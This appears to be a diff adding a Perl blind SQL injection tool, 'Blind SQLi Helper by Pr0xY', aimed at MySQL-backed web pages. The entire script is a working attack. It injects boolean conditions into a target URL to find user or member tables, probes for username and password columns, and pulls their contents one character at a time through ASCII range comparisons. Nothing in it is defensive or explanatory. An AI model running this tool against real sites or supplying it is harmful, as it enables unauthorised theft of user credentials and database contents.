@@ -1,0 +1,265 @@
+#!/usr/bin/perl
+
+use LWP::Simple;
+use LWP::UserAgent;
+use HTTP::Request;
+
+system("cls");
+
+print "+--------------------------------+\n";
+print "+   Blind SQLi Helper by Pr0xY   +\n";
+print "+           Version 1.0          +\n";
+print "+--------------------------------+\n\n";
+
+$target = "";
+$prefix  = "";
+
+@tables = ("user", "users", "member", "members", "customer", "customers");
+@column = ("id","user_name","password","user_id","uid","pass","passwd","user","username");
+@columns_found = ();
+
+$table_name = "";
+
+$ua = LWP::UserAgent->new(agent => 'Mozilla 5.2');
+$ua->timeout(5);
+$ua->env_proxy;
+
+$response = $ua->get($target);
+
+if($response->is_success)
+{
+	$normal = $response->content;
+	print "Target: ".$target."\n\n";
+	
+	$response = $ua->get($target."+AND+SUBSTRING(unhex(hex(\@\@version)),1,1)=5");
+		
+	if($response->is_success && $response->content eq $normal)
+	{		
+		print "*Find table name: \n\n";
+		
+		for($i=0; $i<@tables; $i++)
+		{
+			if(!($prefix eq ""))
+			{
+				@names = ($tables[$i], $tables[$i]."_".$prefix, $prefix."_".$tables[$i]);
+				
+				for($j=0; $j<@names; $j++)
+				{
+					$injAdd = "+AND+(SELECT+1+FROM+".$names[$j]."+LIMIT+0,1)=1";
+					print $injAdd." - ";
+					
+					$response = $ua->get($target.$injAdd);
+
+					if($response->is_success)
+					{
+						if($response->content eq $normal)
+						{
+							print "True\n";
+							
+							$table_name = $names[$j];
+							$j = @names;
+							$i = @tables;
+						}
+						else{print "False\n"};						
+					}
+					else
+					{
+						print "False\n\nError connection!\n\n";
+						$e = 1;
+						$j = @names;
+						$i = @tables;
+					}
+				}
+			}
+			else
+			{
+				$injAdd = "+AND+(SELECT+1+FROM+".$tables[$i]."+LIMIT+0,1)=1";
+				print $injAdd." - ";
+				
+				$response = $ua->get($target.$injAdd);
+				
+				if($response->is_success)
+				{
+					if($response->content eq $normal)
+					{
+						print "True\n";
+							
+						$table_name = $tables[$i];
+						$j = @names;
+						$i = @tables;
+					}
+					else{print "False\n"};					
+				}
+				else
+				{
+					print "False\n\nError connection!\n\n";
+					$e = 1;
+					$j = @names;
+					$i = @tables;
+				}
+				
+			}
+		}
+		
+		if(!($table_name eq "") && $e != 1)
+		{
+			print "\nTable name is: ".$table_name."\n\n*Find columns name: \n\n";
+			
+			for($i=0; $i<@column; $i++)
+			{
+				$injAdd = "+AND+(SELECT+SUBSTRING(CONCAT(1,".$column[$i]."),1,1)+from+".$table_name."+limit+0,1)=1";
+				print $injAdd." - ";
+				
+				$response = $ua->get($target.$injAdd);
+				
+				if($response->is_success)
+				{
+					if($response->content eq $normal)
+					{
+						print "True\n";
+						$columns_found[@columns_found] = $column[$i];
+					}
+					else{print "False\n"};			
+				}
+				else
+				{
+					print "False\n\nError connection!\n\n";
+					$e = 1;
+					$i = @column;
+				}
+			}
+			
+			if(@columns_found > 0)
+			{
+				print "\nColumns:\n\n";
+				
+				for($i=0; $i<@columns_found; $i++)
+				{
+					print "   *".$columns_found[$i]."\n";
+					
+					if($i != (@columns_found-1)){$concat .= $columns_found[$i].",0x3a,";}
+					else{$concat .= $columns_found[$i];}
+				}
+				print "\nCONCAT(".$concat.")\n\nFind ACSII'S Values:\n\n";
+				
+				$start_find = 1;
+				$substring  = 1;
+				$limit      = 0;
+				
+				while($start_find == 1)
+				{
+					$between   = 30;
+					
+					$injAdd = "+AND+ASCII(SUBSTR((SELECT+CONCAT(".$concat.")FROM+".$table_name."+LIMIT+".$limit.",1),".$substring.",1))BETWEEN+".$between."+AND+".($between+10);
+					
+					print $injAdd." - ";
+					
+					$response = $ua->get($target.$injAdd);
+					
+					if($response->is_success)
+					{
+						$c = $response->content;
+						
+						if(!($c eq $normal))
+						{
+							print " False\n";
+							
+							while(!($c eq $normal))
+							{
+								$between+=10;
+								$injAdd = "+AND+ASCII(SUBSTR((SELECT+CONCAT(".$concat.")FROM+".$table_name."+LIMIT+".$limit.",1),".$substring.",1))BETWEEN+".$between."+AND+".($between+10);
+								
+								print $injAdd." - ";
+								
+								$response = $ua->get($target.$injAdd);
+								if($response->is_success)
+								{
+									$c = $response->content;
+									
+									if($c eq $normal)
+									{
+										print "True\n";
+									}
+									else{print "False\n";}
+								}
+							}
+						}
+						else{print "True\n";}
+						
+						$injAdd = "+AND+ASCII(SUBSTR((SELECT+CONCAT(".$concat.")FROM+".$table_name."+LIMIT+".$limit.",1),".$substring.",1))>".$between;
+						print $injAdd." - ";
+						
+						$response = $ua->get($target.$injAdd);
+						
+						if($response->is_success)
+						{
+							$c = $response->content;
+							if($c eq $normal)
+							{
+								print " False\n";
+								
+								while($c eq $normal)
+								{
+									$between+=1;
+									$injAdd = "+AND+ASCII(SUBSTR((SELECT+CONCAT(".$concat.")FROM+".$table_name."+LIMIT+".$limit.",1),".$substring.",1))>".$between;
+									print $injAdd." - ";
+									
+									$response = $ua->get($target.$injAdd);
+									if($response->is_success)
+									{
+										$c = $response->content;
+										if($c eq $normal){print "False\n";}
+										else
+										{
+											print "True\n\nChr value:".$between."\n\n";
+											$chars[@chars] = $between;
+										}
+									}
+								}
+							}
+							else
+							{
+								print "True\n\nChr value:".$between."\n\n";
+								$chars[@chars] = $between;
+							}
+						}
+						else
+						{
+							print "False\n\nError connection!\n\n";
+							$start_find = 0;
+						}
+					}
+					$substring+=1;	
+					
+					$injAdd = "+AND+ASCII(SUBSTR((SELECT+CONCAT(".$concat.")FROM+".$table_name."+LIMIT+".$limit.",1),".$substring.",1))=0";		
+					print "\n".$injAdd."\nFinish? (";
+					
+					for($i=0; $i<@chars; $i++){print chr($chars[$i]);}
+					print ") - ";
+					
+					$response = $ua->get($target.$injAdd);
+					
+					if($response->is_success)
+					{
+						if($response->content eq $normal)
+						{
+							print "True\n\n";
+							$start_find = 0;
+						}
+						else{print "False\n\n";}
+					}
+					else
+					{
+						print "False\n\nError connection!\n\n";
+						$start_find = 0;
+					}
+				}
+
+				for($i=0; $i<@chars; $i++){print chr($chars[$i]);}
+			}
+		}
+		else{print "\nSorry, cannot find the table name :[";}
+	}
+	else{print "It's not MySQL 4/SQL Injection\n";}
+}
+else{print "\nCan not find the file requested(404)\n".$target." Is not found!\n\n";}
